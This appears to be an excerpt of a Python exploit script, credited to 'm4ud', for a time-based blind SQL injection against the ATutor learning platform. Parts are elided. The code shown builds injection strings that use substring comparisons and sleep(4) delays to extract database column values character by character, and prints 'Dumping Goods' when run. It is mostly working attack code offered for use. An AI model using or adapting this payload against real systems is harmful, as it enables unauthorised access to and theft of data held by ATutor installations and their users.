# Atutor Blind Time-Based SQLi tool
# Author: (m4ud)
#
...
#    self.target = options.target
    ...
    def dumpName(self, o, tableCL, tableName, columnName, dbName):
        for x in range(1, int(tableCL)):
            try:
                try:
                    injection_string = "/**/or/**/(select/**/IF(ascii(substring("+str(self.columnName)+"," + str(x) + ",1))=" + "[M4UD]" + ",sleep(4),NULL)/**/from/**/"+str(self.dbName)+"."+ str(self.tableName) +"/**/limit/**/"+str(o)+ ",1)%23"
...
def main():
    ...
    if options.tableName and options.columnName and options.dbName and options.injection:
        print "\r\n(m4ud) Blind Time-Based sql-jutsu \r\n"
        print "\r\n[*] Dumping Goods"
        #injection = options.injection
